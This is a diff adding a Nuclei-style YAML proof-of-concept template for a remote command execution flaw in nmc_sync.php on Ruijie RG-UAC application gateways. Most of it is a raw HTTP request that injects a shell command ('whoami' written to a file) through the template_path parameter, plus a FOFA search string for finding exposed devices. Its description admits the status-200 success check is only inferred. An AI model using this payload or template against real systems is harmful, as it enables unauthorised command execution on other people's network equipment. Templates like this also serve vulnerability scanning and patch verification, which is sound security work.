@@ -1,0 +1,25 @@
+id: poc-1d736abd796bd590b945
+info:
+  name: 锐捷RG-UAC应用网关nmc_sync.php前台RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/1d736abd796bd590b9454c51c0f3411b
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 1d736abd796bd590b9454c51c0f3411b
+    fofa: fofa：app="Ruijie-RG-UAC"
+http:
+- raw:
+  - 'GET /view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|whoami%20>dudesuite.txt|cat HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
